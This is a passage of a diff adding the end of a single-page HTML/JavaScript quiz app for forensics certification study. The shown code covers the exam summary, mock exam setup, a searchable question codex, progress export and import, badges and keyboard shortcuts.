+            <div class="rounded-2xl bg-slate-900/80 border border-white/10 p-4 text-center">
+              <div class="text-[11px] font-mono-tech text-slate-400">ACCURACY</div>
+              <div class="text-2xl font-black font-mono-tech ${acc >= 70 ? 'text-emerald-300' : 'text-rose-300'}">${acc}%</div>
+            </div>
+            <div class="rounded-2xl bg-slate-900/80 border border-white/10 p-4 text-center">
+              <div class="text-[11px] font-mono-tech text-slate-400">SCORE</div>
+              <div class="text-2xl font-black font-mono-tech text-white">${session.score}/${total}</div>
+            </div>
+            <div class="rounded-2xl bg-slate-900/80 border border-white/10 p-4 text-center">
+              <div class="text-[11px] font-mono-tech text-slate-400">XP EARNED</div>
+              <div class="text-2xl font-black font-mono-tech text-cyan-300">+${session.xpEarned}</div>
+            </div>
+          </div>
+
+          ${missed.length ? `
+            <h3 class="text-sm font-black font-mono-tech text-rose-300 mb-3">MISSED EVIDENCE (${missed.length}) — ROUTED TO LOCKER</h3>
+            <div class="space-y-2.5 max-h-[360px] overflow-y-auto pr-1 mb-6">
+              ${missed.map(({ q }) => {
+                const ansText = (Array.isArray(q.answer) ? q.answer : [q.answer]).map(i => q.options[i]).join(' | ');
+                return `
+                  <div class="rounded-xl bg-slate-900/80 border border-white/10 border-l-4 border-l-rose-500 p-3.5 text-xs">
+                    <div class="font-bold text-slate-100">${q.id}: ${escapeHtml(q.question)}</div>
+                    <div class="text-emerald-300 font-semibold mt-1">✓ ${escapeHtml(ansText)}</div>
+                    <div class="text-slate-400 mt-1">${escapeHtml(q.explanation)}</div>
+                  </div>
+                `;
+              }).join('')}
+            </div>
+          ` : `<div class="rounded-xl bg-emerald-500/15 border border-emerald-400/40 p-4 text-sm font-bold text-emerald-200 mb-6">🏆 100% Clean Sweep! Zero missed items.</div>`}
+
+          <div class="flex flex-wrap gap-3">
+            <button id="btn-sum-home" class="px-5 py-2.5 rounded-xl bg-gradient-to-r from-emerald-400 to-cyan-400 text-slate-950 font-black text-sm hover:brightness-110 transition">Return to Dashboard</button>
+            ${Object.keys(state.locker).length ? `<button id="btn-sum-locker" class="px-5 py-2.5 rounded-xl bg-amber-500/20 hover:bg-amber-500/30 border border-amber-400/40 text-amber-200 font-bold text-sm transition">Drill Evidence Locker (${Object.keys(state.locker).length})</button>` : ''}
+          </div>
+        </div>
+      `;
+
+      session = null;
+      $('btn-sum-home').addEventListener('click', renderHome);
+      $('btn-sum-locker')?.addEventListener('click', startEvidenceLocker);
+    }
+
+    // ==================== COURTROOM EXAM SETUP ====================
+    function renderExamSetup() {
+      stopTimer();
+      route = 'exam-setup';
+      root.innerHTML = `
+        <div class="max-w-xl mx-auto glass rounded-3xl p-6 sm:p-8 neon-glow-purple animate-pop">
+          <button id="btn-exam-back" class="px-3 py-1.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-bold text-slate-300 mb-4">← Dashboard</button>
+          <div class="text-xs font-mono-tech font-bold text-purple-300 mb-1">SIMULATED CERTIFICATION TRIAL</div>
+          <h2 class="text-2xl font-black mb-4">⚖️ Courtroom Exam Setup</h2>
+          <div class="space-y-4 mb-6">
+            <div>
+              <label class="block text-xs font-mono-tech text-slate-400 mb-1.5">QUESTION COUNT</label>
+              <select id="exam-count" class="w-full rounded-xl bg-slate-900 border border-white/15 px-3.5 py-2.5 text-sm text-white">
+                <option value="15">15 Questions (15 min — Quick Hearing)</option>
+                <option value="30" selected>30 Questions (30 min — Standard Case)</option>
+                <option value="50">50 Questions (50 min — Extended Trial)</option>
+                <option value="all">All Loaded Questions (${QUESTIONS.length})</option>
+              </select>
+            </div>
+            <div>
+              <label class="block text-xs font-mono-tech text-slate-400 mb-1.5">EVIDENCE SCOPE</label>
+              <select id="exam-scope" class="w-full rounded-xl bg-slate-900 border border-white/15 px-3.5 py-2.5 text-sm text-white">
+                <option value="all" selected>All Loaded Case Files</option>
+                <option value="audit">Audit-Flagged / Errata Only</option>
+              </select>
+            </div>
+          </div>
+          <p class="text-xs text-slate-400 mb-5">Explanations are hidden during the exam. Passing score is <strong>70%</strong>. Any missed items automatically route to your Evidence Locker.</p>
+          <button id="btn-begin-exam" class="w-full py-3 rounded-xl bg-gradient-to-r from-purple-500 to-cyan-400 text-slate-950 font-black text-sm hover:brightness-110 transition">Begin Courtroom Exam →</button>
+        </div>
+      `;
+      $('btn-exam-back').addEventListener('click', renderHome);
+      $('btn-begin-exam').addEventListener('click', () => {
+        const countVal = $('exam-count').value;
+        const scope = $('exam-scope').value;
+        let pool = [...QUESTIONS];
+        if (scope === 'audit') pool = pool.filter(q => q.auditFlag);
+        if (!pool.length) return showToast('No questions match that scope.', 'amber');
+        pool.sort(() => Math.random() - 0.5);
+        const limit = countVal === 'all' ? pool.length : Math.min(Number(countVal), pool.length);
+        const selected = pool.slice(0, limit);
+        initSession({
+          mode: 'exam',
+          title: `Courtroom Exam (${selected.length} Qs)`,
+          badge: 'MOCK EXAM',
+          badgeStyle: 'bg-purple-500/20 text-purple-200 border-purple-400/30',
+          questions: selected,
+          examSecondsLeft: selected.length * 60
+        });
+      });
+    }
+
+    // ==================== FORENSIC CODEX ====================
+    function renderCodex() {
+      stopTimer();
+      route = 'codex';
+      const filtered = QUESTIONS.filter(q => {
+        if (codexFilter === 'mastered' && !state.answered[q.id]?.correct) return false;
+        if (codexFilter === 'unseen' && state.answered[q.id]) return false;
+        if (codexFilter === 'locker' && !state.locker[q.id]) return false;
+        if (codexFilter === 'audit' && !q.auditFlag) return false;
+        if (codexQuery) {
+          const hay = `${q.id} ${q.domain} ${q.question} ${q.explanation} ${q.options.join(' ')}`.toLowerCase();
+          if (!hay.includes(codexQuery.toLowerCase())) return false;
+        }
+        return true;
+      });
+
+      root.innerHTML = `
+        <div class="animate-pop">
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
+            <div class="flex items-center gap-3">
+              <button id="btn-codex-back" class="px-3 py-1.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-bold text-slate-300">← Dashboard</button>
+              <h2 class="text-xl font-black">📚 Forensic Evidence Codex</h2>
+            </div>
+            <input id="codex-search" type="text" value="${escapeHtml(codexQuery)}" placeholder="Search tools, ports, commands, laws..." class="w-full sm:w-72 rounded-xl bg-slate-900 border border-white/15 px-3.5 py-2 text-xs text-white focus:outline-none focus:border-cyan-400" />
+          </div>
+
+          <div class="flex flex-wrap gap-2 mb-5">
+            ${[['all', 'All'], ['mastered', 'Verified'], ['unseen', 'Unseen'], ['locker', 'In Locker'], ['audit', '⚠ Audit/Errata']].map(([k, lbl]) => `
+              <button data-f="${k}" class="codex-f px-3 py-1.5 rounded-xl text-xs font-bold font-mono-tech border transition ${codexFilter === k ? 'bg-cyan-500/20 text-cyan-200 border-cyan-400' : 'bg-white/5 text-slate-400 border-white/10 hover:text-white'}">${lbl}</button>
+            `).join('')}
+            <span class="ml-auto text-xs font-mono-tech text-slate-400 self-center">${filtered.length} items</span>
+          </div>
+
+          <div class="grid gap-3">
+            ${filtered.map(q => {
+              const ans = (Array.isArray(q.answer) ? q.answer : [q.answer]).map(i => q.options[i]).join(' | ');
+              const verified = state.answered[q.id]?.correct;
+              return `
+                <div class="glass rounded-2xl p-4 border ${verified ? 'border-emerald-500/30' : 'border-white/10'}">
+                  <div class="flex flex-wrap items-center gap-2 mb-1.5 text-[11px] font-mono-tech">
+                    <span class="text-cyan-300 font-bold">${q.id}</span>
+                    <span class="text-slate-400">· ${q.domain}</span>
+                    ${verified ? '<span class="text-emerald-300">✓ Verified</span>' : ''}
+                    ${q.auditFlag ? '<span class="text-amber-300">⚠ Audit Flag</span>' : ''}
+                  </div>
+                  <div class="text-sm font-semibold text-white mb-2">${escapeHtml(q.question)}</div>
+                  <div class="text-xs font-bold text-emerald-300 mb-1">Answer: ${escapeHtml(ans)}</div>
+                  <div class="text-xs text-slate-400">${escapeHtml(q.explanation)}</div>
+                </div>
+              `;
+            }).join('') || '<div class="glass rounded-2xl p-6 text-center text-sm text-slate-400">No evidence matches your filter.</div>'}
+          </div>
+        </div>
+      `;
+
+      $('btn-codex-back').addEventListener('click', renderHome);
+      $('codex-search').addEventListener('input', e => { codexQuery = e.target.value; renderCodex(); });
+      document.querySelectorAll('.codex-f').forEach(b => b.addEventListener('click', () => { codexFilter = b.dataset.f; renderCodex(); }));
+    }
+
+    // ==================== MODALS (SYNC & BADGES) ====================
+    function openSyncModal() {
+      openModal(`
+        <div class="flex items-center justify-between mb-3">
+          <h3 class="text-lg font-black font-mono-tech">⇄ PROGRESS SYNC &amp; BACKUP</h3>
+          <button id="m-close" class="p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-slate-300">✕</button>
+        </div>
+        <p class="text-xs text-slate-400 mb-4">Export your progress JSON to sync cleanly between your laptop and tablet, or import an existing backup.</p>
+        <div class="grid gap-2.5">
+          <button id="m-export" class="w-full py-2.5 rounded-xl bg-gradient-to-r from-emerald-400 to-cyan-400 text-slate-950 font-black text-sm">⬇ Export Progress (JSON)</button>
+          <label class="w-full py-2.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/15 text-center text-sm font-bold text-slate-200 cursor-pointer">
+            ⬆ Import Progress (JSON)
+            <input id="m-import" type="file" accept=".json" hidden />
+          </label>
+          <button id="m-reset" class="w-full py-2.5 rounded-xl bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/40 text-rose-300 font-bold text-sm mt-2">⚠ Reset All Progress</button>
+        </div>
+      `);
+      $('m-close').addEventListener('click', closeModal);
+      $('m-export').addEventListener('click', () => {
+        const blob = new Blob([JSON.stringify(state, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `chfi-neon-progress-${new Date().toISOString().slice(0, 10)}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+        showToast('Progress JSON exported!', 'green');
+      });
+      $('m-import').addEventListener('change', e => {
+        const f = e.target.files[0];
+        if (!f) return;
+        const r = new FileReader();
+        r.onload = () => {
+          try {
+            const parsed = JSON.parse(r.result);
+            if (typeof parsed.xp !== 'number') throw new Error();
+            state = { ...DEFAULT_STATE, ...parsed };
+            saveState();
+            closeModal();
+            renderHome();
+            showToast('Progress imported!', 'green');
+          } catch {
+            showToast('Invalid JSON file.', 'red');
+          }
+        };
+        r.readAsText(f);
+      });
+      $('m-reset').addEventListener('click', () => {
+        if (!confirm('Reset all XP, streaks, and Evidence Locker data?')) return;
+        state = structuredClone(DEFAULT_STATE);
+        saveState();
+        closeModal();
+        renderHome();
+        showToast('Progress wiped.', 'amber');
+      });
+    }
+
+    function openBadgesModal() {
+      openModal(`
+        <div class="flex items-center justify-between mb-4">
+          <h3 class="text-lg font-black font-mono-tech">🏆 FORENSIC BADGES &amp; RANKS</h3>
+          <button id="m-close" class="p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-slate-300">✕</button>
+        </div>
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-5">
+          ${BADGES.map(b => {
+            const unlocked = b.check(state, QUESTIONS);
+            return `
+              <div class="rounded-2xl p-3.5 border ${unlocked ? 'bg-emerald-500/10 border-emerald-400/40' : 'bg-slate-900/60 border-white/10 opacity-50'} flex items-center gap-3">
+                <div class="text-2xl">${b.icon}</div>
+                <div>
+                  <div class="text-xs font-extrabold text-white">${b.name}</div>
+                  <div class="text-[11px] text-slate-400">${b.desc}</div>
+                </div>
+              </div>
+            `;
+          }).join('')}
+        </div>
+        <div class="text-xs font-mono-tech text-slate-400 mb-2">RANK LADDER</div>
+        <div class="flex flex-wrap gap-2">
+          ${RANKS.map(r => `
+            <span class="px-2.5 py-1 rounded-lg text-xs font-mono-tech border ${state.xp >= r.minXp ? 'bg-cyan-500/15 border-cyan-400/40 text-cyan-200' : 'bg-slate-900 border-white/10 text-slate-500'}">
+              ${r.icon} ${r.name} (${r.minXp} XP)
+            </span>
+          `).join('')}
+        </div>
+      `);
+      $('m-close').addEventListener('click', closeModal);
+    }
+
+    // ==================== KEYBOARD SHORTCUTS ====================
+    document.addEventListener('keydown', e => {
+      if (!$('modal-overlay').classList.contains('hidden')) {
+        if (e.key === 'Escape') closeModal();
+        return;
+      }
+      if (route !== 'session' || !session) return;
+      const k = e.key.toLowerCase();
+      if (k === 'escape') { renderHome(); return; }
+      if (k === 'f') { e.preventDefault(); toggleFlagCurrent(); return; }
+
+      const q = session.questions[session.index];
+      const isMulti = Array.isArray(q.answer);
+      if (!session.answeredCurrent) {
+        const map = { '1': 0, '2': 1, '3': 2, '4': 3, 'a': 0, 'b': 1, 'c': 2, 'd': 3 };
+        if (k in map && map[k] < q.options.length) {
+          e.preventDefault();
+          handleOptionClick(map[k]);
+        } else if (isMulti && k === 'enter' && session.selectedMulti.size > 0) {
+          e.preventDefault();
+          evaluateAnswer([...session.selectedMulti], false);
+        }
+      } else if (k === 'enter' || k === ' ') {
+        e.preventDefault();
+        advanceQuestion();
+      }
+    });
+
+    function escapeHtml(str) {
+      return String(str).replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]));
+    }
+
+    // ==================== TOP HUD EVENTS ====================
+    $('btn-home-logo').addEventListener('click', renderHome);
+    $('btn-locker-hud').addEventListener('click', startEvidenceLocker);
+    $('btn-sync-hud').addEventListener('click', openSyncModal);
+    $('btn-badges-hud').addEventListener('click', openBadgesModal);
+    $('btn-audio-hud').addEventListener('click', () => {
+      state.audioOn = !state.audioOn;
+      saveState();
+      showToast(state.audioOn ? 'Arcade SFX Enabled' : 'Arcade SFX Muted', 'cyan');
+    });
+
+    // Boot
+    updateHUD();
+    renderHome();
+  })();
+  </script>
+</body>
+</html>
